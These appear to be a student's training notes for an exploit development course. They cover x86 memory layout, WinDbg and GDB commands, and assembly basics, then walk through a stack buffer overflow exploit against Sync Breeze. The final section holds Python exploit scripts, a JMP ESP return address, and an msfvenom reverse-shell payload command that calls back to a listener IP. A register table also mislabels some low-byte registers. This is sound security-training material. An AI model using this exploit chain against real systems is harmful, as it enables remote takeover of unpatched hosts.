# WinDbg and x86 Architecture

```bash
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /size:1900x880 /u:Offsec /p:lab /v:192.168.181.10 /drive:EXP-301,/home/kali/OffSec/EXP-301

rdesktop -a 16 -z -r sound:remote -x b -D -x m -g 1900x900 -u Offsec -p lab 192.168.167.10
```

## x86 Architecture

Process memory is allocated in Windows between the memory address 0x00000000 and 0x7FFFFFFF.

|            |       |
| ---------- | ----- |
| 0x00000000 |       |
|            | Stack |
| 0x00400000 | Program Image |
|            | Process Environment Block (PEB) |
|            | Thread Environment Block (TEB) |
|            | Heap |
|            |      |
|            | Dynamic Link Library (DLL) |
| 0x7FFDF000 |                            |
| 0x7FFFFFFF | Kernel Memory Space |
| 0xFFFFFFFF |                     |

When a thread is running, it executes code from within the **Program Image** or from various **DLLs**.

Each thread in a running application has its own **stack** which is a short-term data area for functions, local variables, and program control information.

Last-In, First-Out: While accessing the stack, items put ("pushed") on the top of the stack are removed ("popped") first.

The x86 architecture implements dedicated **PUSH** and **POP** assembly instructions to add or remove data to the stack respectively.

Multiple **calling conventions** (The Windows x86 API makes use of the **__stdcall** calling convention)

- How the parameters and return value are passed (placed in CPU registers, pushed on the stack, or both), in which order they are passed

- How the stack is prepared and cleaned up before and after the call, and what CPU registers the called function must preserve for the caller.

When a function ends, the **return address** is taken from the stack and used to restore the execution flow to the calling function.

The "return address" (+ function's parameters and local variables) is associated with one function call and is stored in a **stack frame**.

| Thread Stack Frame Example |
| -------------------------- |
| Function A return address:    0x00401024 |
| Parameter 1 for function A:   0x00000040 |
| Parameter 2 for function A:   0x00001000 |
| Parameter 3 for function A:   0xFFFFFFFF |

| 32-bit register | Lower 16 bits | Higher 8 bits | Lower 8 bits |
| --------------- | ------------- | ------------- | ------------ |
| EAX             | AX            | AH            | AL           |
| EBX             | BX            | BH            | AL           |
| ECX             | CX            | CH            | AL           |
| EDX             | DX            | DH            | AL           |
| ESI             | SI            | N/A           | N/A          |
| EDI             | DI            | N/A           | N/A          |
| EBP             | BP            | N/A           | N/A          |
| ESP             | SP            | N/A           | N/A          |
| EIP             | IP            | N/A           | N/A          |

General purpose registers:
- EAX (accumulator): Arithmetical and logical instructions
- EBX (base): Base pointer for memory addresses
- ECX (counter): Loop, shift, and rotation counter
- EDX (data): I/O port addressing, multiplication, and division
- ESI (source index): Pointer addressing of data and source in string copy operations
- EDI (destination index): Pointer addressing of data and destination in string copy operations

The stack is **dynamic** and changes constantly during program execution.

The stack pointer **ESP** keeps "track" of the most recently referenced location on the stack (top of the stack) by storing a pointer to it.

A pointer is a reference to an address (or location) in memory.

A register "stores a pointer" or "points" to an address:
=> The register is storing that target address

For a function to locate its stack frame, which stores the required arguments, local variables, and the return address.

=> The base pointer **EBP** stores a pointer to the top of the stack when a function is called. By accessing EBP, a function can easily reference information from its stack frame (via **offsets**) while executing.

EIP, the instruction pointer, always points to the next code instruction to be executed.

## WinDbg

`Attach to a Process...` (F6 key)

The debugger injects a software breakpoint by overwriting the current instruction in memory with an `INT 3` assembly instruction.

Note: If we do not enter a 'g' (Go) at the command window prompt, the application will stay suspended.

**Disassembly** view shows the next instructions to be executed by the CPU.

**Command** window will allow us to interact with WinDbg and use more advanced features such as the built-in scripting language.

Customized WinDbg to roughly mimic the layout of the **Immunity Debugger**

| Left        | Right     |
| ----------- | --------- |
| Disassembly | Registers |
| Memory      | Memory    |
| Command     |           |

End the current debugging session in 2 ways:

1. Selecting `Debug > Detach Debugee`, which leaves the application running.

2. Selecting `Debug > Stop Debugging` or with the `Shift + F5` keyboard shortcut, which closes the application.

The command `.hh` , and refer to the cheat sheet `http://windbg.info/doc/1-common-cmds.html` for a quick review.

### Debugging Symbols

**Symbol files** permit WinDbg to reference internal functions, structures, and global variables using names instead of addresses.

Configuring the symbols path allows WinDbg to fetch symbol files for **native Windows executables and libraries** from the official Microsoft symbol store.

The symbols files (with extension `.PDB`) are created when the native Windows files are compiled by Microsoft.

`https://msdl.microsoft.com/download/symbols`

Microsoft does not provide symbol files for all library files, and 3rd party applications may have their own symbol files.

Set up the debugging environment:
- Access the symbol settings through the `File > Symbol File Path...` menu. A commonly used symbol path is `C:\symbols`.

Force the download of available symbols for all loaded modules before debugging

`.reload /f`

Inspect the assembly code of certain Windows APIs + any part of the code of the current running program.

The `u` command accepts either a single **memory address** or a **range of memory** as an argument, i.e. where to start disassembling from.

If we do not specify this argument, the disassembly will begin at the memory address stored in **EIP**.

Select `Break` from the `Debug` menu to halt execution.

Provide a **function symbol** or a memory address

```
u kernel32!GetCurrentThread
u myapp!main L3
u 00a01020
u @eip
```

`ub` command is a variation on the unassemble command that disassembles instructions prior to the supplied address.

`ub 00c0299b L1`

### Reading from Memory

| Size indicator        | Example               |   
| --------------------- | --------------------- |
| byte                  | db kernel32!WriteFile |
| words (two bytes)     | dw @esp               |
| DWORDs (four bytes)   | dd @esp               |
| QWORDs (eight bytes)  | dq 00faf974           |


Display ASCII characters in memory + WORDs or DWORDs

```
dW KERNELBASE+0x40
dc KERNELBASE
```

The default length when displaying data is **0x80** bytes.

- `dW L2` command outputs 2 WORDS
- `db L2` outputs 2 bytes.

```
db memory!ugreeting L1a
dW KERNELBASE L2
dd @esp L10
```

Display the memory content at a specified address as

- ASCII format using the `da` command
- Unicode format using the `du` command.

```
da @esp
da memory!greeting
da 00b4c0a8
du @edi
```

Display data referenced from a memory address. (same as using `dd`  twice to emulate a memory dereference)

```
dd poi(esp)
da poi(memory!ptr)
```

```
dd @esp L1
dd 771bab89
```

### Dumping Structures from Memory

The `dt` command takes the **name of the structure** to display as an argument and, optionally, a **memory address** from which to dump the structure data.

Each specified field for that structure is shown at the relative specific **offset** into the structure, field name and its data type**.

For cases where a field points to a **nested structure**, the field data type is replaced by the correct **sub-structure type**.

- The sub-structure type can also be identified with an **underscore** (_) leading the field type

- The field type name in **capital letters**.

The structure needs to be provided by one of the loaded **symbol files**.

Supply the `-r` flag to the `dt` command to recursively **display nested structures** where present.

The **$teb** pseudo register == address of the Thread Environment Block (TEB)

Display specific fields in the structure by passing the **name of the field** as an additional parameter.

```
dt memory!_HACKER
dt -r memory!_HACKER
dt -r1 memory!_HACKER
dt memory!_HACKER handle
dt memory!_HACKER handle id
dt memory!_HACKER biography.age
dt memory!_HACKER 00b4de40
dt -r memory!_HACKER 00b4de40 biography.profile.favfood

dt ntdll!_TEB
dt -r ntdll!_TEB @$teb
dt ntdll!_TEB @$teb ThreadLocalStoragePointer
```

Display the **size of a structure** extracted from a symbol file

`?? sizeof(ntdll!_TEB)`

### Writing to Memory

```
ed esp 41414141
eb memory!integer 41 42 43 44
```

`ea` and `eu` do not null terminate strings.

=> `eza` and `ezu` commands for ASCII and Unicode strings, respectively

```
ea esp "Hello"
ea memory!greeting "Goodbye!"
eu memory!ugreeting "Farewell!"

eza memory!greeting "Goodbye!"
```

### Searching the Memory Space

4 additional parameters to perform a search:

1. The memory type to search for (`-d` for DWORD)
2. The starting point of memory to search (0)
3. The length of memory to search (to search the whole memory range, enter "L?80000000")
4. The pattern to search for (41414141)

```
s -b 0 L?80000000 48 65 6c 6c 6f
s -d 0 L?80000000 41414141
s -a 0 L?80000000 "This program cannot be run in DOS mode"
s -a 0xb80000 L1000 "I'm an egg"
s -u 0 L?80000000 w00tw00t
```

### Inspecting and Editing CPU Registers in WinDbg

```
r

r ecx
r zf

r ecx=41414141
r zf = 0
```

### Controlling the Program Execution in WinDbg

2 different types of breakpoints; software and processor/hardware breakpoints.

#### Software Breakpoints

Use the `bl` command to list all the breakpoints.

Let the execution continue by issuing the `g` command.

Disable and enable breakpoints using the `bd` (disable) and `be` (enable) commands.

Clear breakpoints using the `bc` command

```
bl
bd 0
be 0
bc 0
bc *
```

Set a breakpoint that will halt the execution flow of the application when changes are being saved to a file.

```
bp kernel32!WriteFile
bp flow!breakme
bp 00c01020
g
```

Use the `bu` command to set a breakpoint on an unresolved function. This is a function residing in a module that isn't yet loaded in the process memory space.

The breakpoint will be enabled when the module is loaded and the target function is resolved.

```
lm m ole32
bu ole32!WriteStringStream
g
```

While the breakpoint is resolved when `ole32.dll` is loaded, it is not triggered. Because our actions did not force a call to ole32!WriteStringStream

Execute the `.printf` command every time the breakpoint set on the kernel32!WriteFile API is triggered - Display the number of bytes to write to the target file (3rd argument)

```
bp kernel32!WriteFile ".printf \"The number of bytes written is: %p\", poi(esp + 0x0C);.echo;g"

bp flow!doubl ".printf \"The value of the argument: %x\", poi(esp+4); .echo"

bp flow!doubl ".printf \"The contents of the global variable: %ma\", flow!data; .echo"

bp flow!doubl ".if (poi(esp+4) > 0x20) {.printf \"The value of the argument: %x\", poi(esp+4); .echo} .else {gc}"
```

`.printf` supports the use of format strings such as `%p`, which will display the given value as a pointer.

The `.echo` command displays the output of .printf to the WinDbg command window.

The WriteFile prototype:

```c
BOOL WriteFile(
  HANDLE       hFile,
  LPCVOID      lpBuffer,
  DWORD        nNumberOfBytesToWrite,
  LPDWORD      lpNumberOfBytesWritten,
  LPOVERLAPPED lpOverlapped
);
```

Windows x86 API: Function arguments are pushed on the stack in reverse order (right to left). In this case, each argument occupies **4 bytes** of memory on the stack.

Halt the execution flow only if we write exactly 4 bytes of data to a file from Notepad

```
bp /w "@eax == 5" 00c010e7

bp kernel32!WriteFile ".if (poi(esp + 0x0C) != 4) {gc} .else {.printf \"The number of bytes written is 4\";.echo;}"
```

When our breakpoint on WriteFile is triggered, use `gc` (go from conditional breakpoint) to resume execution, unless the nNumberOfBytesToWrite argument (3rd argument on the stack) is equal to "4".

#### Hardware Breakpoints

Hardware or processor breakpoints are handled by the processor and stored in the processor's debug registers.

They can stop code execution when a particular type of access, such as read, write, or execute, is made to a targeted memory location.

=> Provide the ability to monitor changes or access to data in memory.

However, the x86 and x64 architectures only use 4 debug registers, so unlike software breakpoints, we are **limited by the number of processor breakpoints**.

Hardware breakpoints must be set after the entry point has been reached and a simple way of doing this is by attaching to a running process.

3 arguments to the `ba` command.
1. The type of access, which can be either e (execute), r (read), or w (write).
2. The size in bytes for the specified memory access
3. The memory address where we want to set the breakpoint at.

```
ba e 1 kernel32!WriteFile
ba r 1 flow!data
ba w 2 03b2c768
g
```

### Stepping Through the Code

The `p` command will execute one single instruction at a time and steps over function calls, and `t` will do the same, but will also step into function calls.

`pt` (step to next return) allows us to fast-forward to the end of a function.

`ph` executes code until a branching instruction is reached. This includes conditional or unconditional branches, function calls, and return instructions.

```
p
p 2
t

pt
tt

ph
th
```

`pa` allow us to execute until a specific instance of a particular command + gives us a step-by-step account of the state of execution.

```
pa 00d0105d
```

### Listing Modules and Symbols in WinDbg

Display all loaded modules, including their starting and ending addresses in virtual memory space:

The `lm` command can also filter modules by accepting the wildcard (*) character:

```
lm
lm m kernel*
```

Dump symbols present from the KERNELBASE module.

```
x kernelbase!CreateProc*
x *!strcpy
x features!???cpy
```

### Using WinDbg as a Calculator

Find the difference between 2 addresses or finding lower or upper byte values of a DWORD

```
? @eip + 24
? 77269bc0  - 77231430
? 77269bc0 >> 18
? 0x12345678 & 0xffff
```

```
? features!buf1 - features!buf2
```

Convert the hex number 41414141 to decimal, then convert the decimal number 0n41414141 to hexadecimal, and finally convert the binary 0y1110100110111 to decimal and hexadecimal.

```
? 41414141
? 0x20
? 0n41414141
? - 0n254
? 0y1110100110111
```

The `.formats` command is also useful for converting between different formats at once, including the ASCII representation of the value

```
.formats 41414141
.formats @esp
.formats 0x12345678 & 0xffff
```

### Pseudo Registers

20 user-defined pseudo registers named $t0 to $t19 can be used as variables during mathematical calculations.

**When using pseudo registers as well as regular registers, it is recommended to prefix them with the "@" character.**

It speeds up the evaluation process because WinDbg will not try to resolve it as a symbol first.

```
? ((41414141 - 414141) * 0n10) >> 8
```

Performed with a pseudo register

```
r @$t0 = (41414141 - 414141) * 0n10
? @$t0 >> 8
```

### WinDbg Extensions

Use `!address` to find out more about the address in the eip register.

The address in eip belongs to the image, which contains the binary instructions, something that is indicated by the "Usage: Image" field.

Other useful information includes the base address and end address of the memory region and its size. + information related to its type, protections, and state.

Contrast this with a stack address:

In this Listing, the same fields are provided, but the address, unsurprisingly, belongs to a different memory region and as a result the fields have different values. Note, in particular, that protections have changed. Although the image is executable, the stack, in this case, is not.

- The `!address` extension command provides information about the **memory range** within which an address falls, which includes it's protections,

- The `!vprot` command provides information about the **specific address**. This is significant because the protections of the page to which the address belongs may have been altered at some point after the memory is allocated.

The `!teb` and `!peb` commands provide us with information about the contents of the TEB (Thread Environment Block) and PEB (Process Environment Block) structures, respectively.

```
!address @eip
!address @esp

!vprot @esp
```

### WinDbg Scripting

`$><C:\windbg_lu\lu5\script.wds`

```nasm
bp features!func
r $t0 = 0
.for (r $t1 = 0; @$t1 < a; r $t1 = @$t1 + 1) 
{
    g
    r $t0 = @$t0 + poi(@esp + 4)
    .printf "Argument: 0x%x (%c)\n", poi(@esp + 4), poi(@esp + 4)
}
.printf "Sum of arguments: 0x%x", @$t0
```

Shorter version using breakpoint-based actions

```nasm
r $t0 = 0
r $t1 = 0
bp features!func "r $t0 = @$t0 + poi(@esp + 4); .printf \"Argument: 0x%x (%c)\\n\", poi(@esp + 4), poi(@esp + 4); r $t1 = @$t1 + 1; .if (@$t1 == 0xa) {.printf \"Sum of arguments: 0x%x\", @$t0}; g"
g
```

# x86-64 (Intel) Assembly

Instructions for **unsigned** number comparisons

| Instruction |          Name                              |
|-------------|--------------------------------------------|
| JE/JZ       | Jump if Equal or Jump if Zero              |
| JNE/JNZ     | Jump if not Equal / Jump if Not Zero       |
| JA/JNBE     | Jump if Above / Jump if Not Below or Equal |
| JAE/JNB     | Jump if Above or Equal / Jump if Not Below |
| JB/JNAE     | Jump if Below / Jump if Not Above or Equal |
| JBE/JNA     | Jump if Below or Equal / Jump if Not Above |

Instructions for **signed** number comparisons

| Instruction |          Name                               |
|-------------|---------------------------------------------|
| JE/JZ       | Jump if Equal or Jump if Zero               |
| JNE/JNZ     | Jump if not Equal / Jump if Not Zero        |
| JG/JNLE     | Jump if Greater / Jump if Not Less or Equal |
| JGE/JNL     | Jump if Greater / Equal or Jump Not Less    |
| JL/JNGE     | Jump if Less / Jump if Not Greater or Equal |
| JLE/JNG     | Jump if Less or Equal / Jump Not Greater    |

## While loop

```c
i = 3;
j = 10;
while (i <> 0)
{
  j++;
  i--;
}
```

```nasm
init_loop:
  MOV ECX, 3
  MOV EAX, 10

loop:
  TEST ECX, ECX
  JZ continue_here
  INC EAX
  DEC ECX
  JMP loop
  
continue_here:
...
```

## If-Else

```c
i = 3;
if (i > 4):
  i = i + 5;
else if (i < 3):
  i = i + 6;
else if (i == 3):
  i++;
i = 4;
```

```nasm
init:
  MOV EAX, 3

branching:
  CMP EAX, 4
  JA add_5
  CMP EAX, 3
  JB add_6
  JE add_1
  JMP end
  
add_5:
  ADD EAX, 5
  JMP end
add_6:
  ADD EAX, 6
  JMP end
add_1:
  INC EAX
  JMP end
  
end:
  MOV EAX, 4
```

```bash
nasm -f elf32 test.asm
ld -m elf_i386 test.o -o test
./test
```

## Hello World in 64-bit Assembly

`hello.asm`

```nasm
global _start

section .text

_start:
  ; write system call
  MOV RDI, 1                ; standard output
  MOV RSI, hello_text       ; address of "Hello world!"
  MOV RDX, hello_text_len   ; length of "Hello world!"
  MOV RAX, 1                ; write syscall number
  SYSCALL

  ; exit system call
  MOV RDI, 0                ; success
  MOV RAX, 60               ; exit syscall number
  SYSCALL

section .data
  hello_text db "Hello world!", 0
  hello_text_len equ $ - hello_text
```

```bash
nasm -f elf64 hello.asm
ld hello.o -o hello
./hello
```

## GDB commands

```bash
gdb test
```

Set the debugger to use the Intel assembly syntax instead of AT&T, which is the default

Disassemble the code with the /r option to also show the **opcodes**

```
break _start
break *0x00401015

delete 2

run
stepi
c

set disassembly-flavor intel

disassemble
disassemble /r
disassemble 0x8049000

info registers
info registers eip

x/4b 0x08049000
x/64xw $esp
x/s 0x402000
```

# Exploiting Stack Overflows

Data Execution Prevention (DEP):
- perform additional memory checks to help prevent malicious code from running on a system.
- helps prevent code execution from data pages by raising an exception when attempts are made to do so.

Address Space Layout Randomization (ASLR) randomizes the base addresses of loaded applications and DLLs every time the OS is booted.

On older Windows OS, like Windows XP where ASLR is not implemented, all DLLs are loaded at the same memory address every time, which makes exploitation easier.

DEP + ASLR provides a very strong mitigation against exploitation.

Control Flow Guard (CFG) is Microsoft's implementation of control-flow integrity.

It performs validation of **indirect code branching** such as a **call instruction that uses a register** as an operand **rather than a memory address** such as CALL EAX.

=> Prevent the overwrite of function pointers in exploits.

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
	char buffer[64];

	if (argc < 2)
	{
		printf("Error - You must supply at least one argument\n");
		return 1;
	}
	
	strcpy(buffer, argv[1]);
	
  return 0;
}
```

| Before StrCpy | Copy with 32 A's | Copy with 80 A's |
| ------------- | ---------------- | ---------------- |
| StrCpy destination address | StrCpy destination address | StrCpy destination address |
| StrCpy source address | StrCpy source address | StrCpy source address |
| Reserved char buffer memory | AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAAA |
| Reserved char buffer memory | AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAAA |
| Reserved char buffer memory | Reserved char buffer memory | AAAAAAAAAAAAAAAA |
| Reserved char buffer memory | Reserved char buffer memory | AAAAAAAAAAAAAAAA |
| Return address of main | Return address of main | AAAA |
| Main parameter 1 | Main parameter 1 | AAAA |
| Main parameter 2 | Main parameter 2 | AAAA |

The CPU will try to read the next instruction from `0x41414141` (hexadecimal value of `AAAA`).

Since this is not a valid address in the process memory space, the CPU will trigger an access violation, crashing the application.

## Controlling EIP

`python stack_overflow_0x01.py 192.168.120.10`

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  inputBuffer = b"A" * size
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
 
  print("Done!")

except socket.error:
  print("Could not connect!")
```

The EIP register is overwritten by four `0x41` bytes, which are part of our `username` string, the 800-byte "A" buffer.

Which part of our buffer is landing in EIP?

1. Attempt a binary tree analysis: Instead of 800 A's, send 400 A's and 400 B's.

- If EIP is overwritten by B's => The 4 bytes are in the 2nd half of the buffer.
- Then change the 400 B's to 200 B's and 200 C's, and send the buffer again.
- Continue splitting the specific buffer until we reach the exact 4 bytes that overwrite EIP.

2. Insert a long string made of non-repeating 4-byte chunks as our input > when the EIP is overwritten with 4 bytes from our string, use that unique sequence to pinpoint the exact location. 

Generate a non-repeating string:

```bash
locate pattern_create
msf-pattern_create -h

msf-pattern_create -l 800
```

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  #inputBuffer = b"A" * size
  inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"
  content = b"username=" + inputBuffer + b"&password=A"
...
```

The EIP register has been overwritten with `42306142` (hexadecimal value of `B0aB`). 

```bash
msf-pattern_offset -l 800 -q 42306142
```

`[*] Exact match at offset 780`

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  filler = b"A" * 780
  eip = b"B" * 4
  buf = b"C" * 16
  inputBuffer = filler + eip + buf
  content = b"username=" + inputBuffer + b"&password=A"
...
```

The EIP now contains our 4 B's (`0x42424242`)

## Locating Space for Our Shellcode

```
r
dds esp L3
dds esp -10 L8
```

The first 4 C's from our buffer landed at address `0x00567458`.

ESP == `0x0056745c`, which points to the next 4 C's from our buffer.

A standard reverse shell payload requires ~350-400 bytes of space.

=> Try increasing the buffer length from 800 bytes to 1500 bytes.

In some cases, increasing the length of a buffer may result in a completely different crash since the larger buffer **overwrites additional data on the stack** that is used by the target application.

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"B" * 4
  offset = b"C" * 4
  shellcode = b"D" * (1500 - len(filler) - len(eip) - len(offset))
  inputBuffer = filler + eip + offset + shellcode
  content = b"username=" + inputBuffer + b"&password=A"
...
```

```
dds esp - 8 L7
dds esp+2c0 L4
```

`? 00567724 - 0056745c`

Evaluate expression: 712 = 000002c48

=> 712 bytes of free space for our shellcode.

## Checking for Bad Characters

Depending on the application, vulnerability type, and protocols in use, there may be certain bad characters that should not be used in our **buffer, return address, or shellcode**.

A bad character prevents or changes the nature of our crash. Or  they end up mangled in memory.

E.g., The null byte (`0x00`) is used to terminate a string in low-level languages such as C/C++. This causes the string copy operation to end, effectively truncating our buffer at the first instance of a null byte. 

Because we are sending the exploit as part of an HTTP POST request, avoid the return character `0x0D`, which signifies the end of an HTTP field (the `username` in this case).

**Send all possible characters** - from `0x00` to `0xFF` - as part of our buffer

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"B" * 4
  offset = b"C" * 4
  badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
  inputBuffer = filler + eip + offset + badchars
  content = b"username=" + inputBuffer + b"&password=A"
...
```

`db esp - 10 L20`

`0x0A` character translates to a **line feed**, which terminates an HTTP field, similar to a **carriage return**.

Repeat these steps until we have verified every character.

=> `0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, 0x3D` will mangle our input buffer while attempting to overflow the destination buffer.

## Finding a Return Address

Find a reliable static address that contains a `JMP ESP` instruction.

Redirect EIP to this address, the `JMP ESP` instruction will be executed and direct the execution flow into our shellcode.

Many support libraries in Windows contain this commonly-used instruction, 2 important criteria:

1. The address used in the library must be static, which eliminates the libraries compiled with **ASLR** support.

2. The address of the instruction must not contain any of the **bad characters** that would break the exploit, since the address will be part of our input buffer.

To determine the protections of a particular module, check the `DllCharacteristics` member of the `IMAGE_OPTIONAL_HEADER` structure, which is part of the `IMAGE_NT_HEADERS` structure.

The `IMAGE_NT_HEADERS` structure can be found in the **PE header** of the target module.

The Portable Executable (PE) format starts with the **MS DOS header**, which contains an offset to the start of the **PE header** at offset `0x3C`.

Find the protections of the `syncbrs.exe` executable

Get the base address of the module

`lm m syncbrs`

Dump the `IMAGE_DOS_HEADER5`

`dt ntdll!_IMAGE_DOS_HEADER 0x00400000`

At offset `0x3C`, the `e_lfanew` field contains the offset to our PE header (`0xE8`) from the base address of `syncbrs.exe`

`? 0n232`

Evaluate expression: 232 = 000000e8

`dt ntdll!_IMAGE_NT_HEADERS 0x00400000+0xe8`

At offset `0x18` we have the `IMAGE_OPTIONAL_HEADER` structure we need that contains the `DllCharacteristics` field.

`dt ntdll!_IMAGE_OPTIONAL_HEADER 0x00400000+0xe8+0x18`

The current value of `DllCharacteristics` is `0x00`.

=> `syncbrs.exe` does not have any protections enabled such as **SafeSEH** (Structured Exception Handler Overwrite), an exploit-preventative memory protection technique, **ASLR**, or **NXCompat** (DEP protection).

The `ImageBase` member being set to `0x400000` => the preferred load address for `syncbrs.exe` is `0x00400000`. 

=> All instructions' addresses (`0x004XXXXX`) will contain at least one null character => unsuitable for our input buffer.

**Process Hacker** tool detects mitigations, such as DEP and ASLR,and more modern mitigations such as ACG and CFG.

Launch **Process Hacker** > Double click the `syncbrs.exe` executable >  Under the **General** tab, find the **Mitigation Policies** field, which is currently set to "None" > Clicking on **Details** also shows no mitigations in place.

Browsing to the **Module** tab provides us with all the **DLLs** that are loaded in the process memory > To inspect the `DllCharacteristics`, double click on a module and open the properties window.

**Advanced tip**: If this application was compiled with **DEP** support, our `JMP ESP` address would need to be located in the `.text` code segment of the module. This is the only segment with both read (R) and executable (E) permissions.

Searching through all the modules, we discover that `LIBSSP.DLL` suits our needs and the **address range** doesn't seem to contain bad characters.

Since DEP is not enabled in this case, we can use instructions from any address in this module.

```bash
msf-nasm_shell
nasm > jmp esp
```
00000000  FFE4              jmp esp

`lm m libspp`

`10000000 10223000   libspp   C (export symbols)       C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll`

`s -b 10000000 10223000 0xff 0xe4`

One address containing a `JMP ESP` instruction (`0x10090c83`), which fortunately does not contain any of our bad characters.

`u 10090c83`

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10" # 0x10090c83 - JMP ESP
  offset = b"C" * 4
  shellcode = "D" * (1500 - len(filler) - len(eip) - len(offset))
  inputBuffer = filler + eip + offset + shellcode
  content = b"username=" + inputBuffer + b"&password=A"
...
```

The `JMP ESP` address is written in reverse order;

**Little endian** is used by the x86 and AMD64 architectures - the low-order byte of the number is stored in memory at the lowest address, and the high-order byte at the highest address.

```
bp 10090c83
g
t
dc eip 4
```

## Generating Shellcode with Metasploit

```bash
msfvenom -l payloads

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

Replace regex `"\n"` with blank in VS Code

## Getting a Shell

Because of the encoding, the shellcode is prepended by a **decoder stub**.

During the process of gathering the decoder stub's location in memory, the code performs a sequence of assembly instructions commonly referred to as a **GetPC** routine.

This routine moves the value of the EIP register into another register.

As with other GetPC routines, those used by `shikata_ga_nai` have an unfortunate side-effect of writing data at and around the top of the stack.
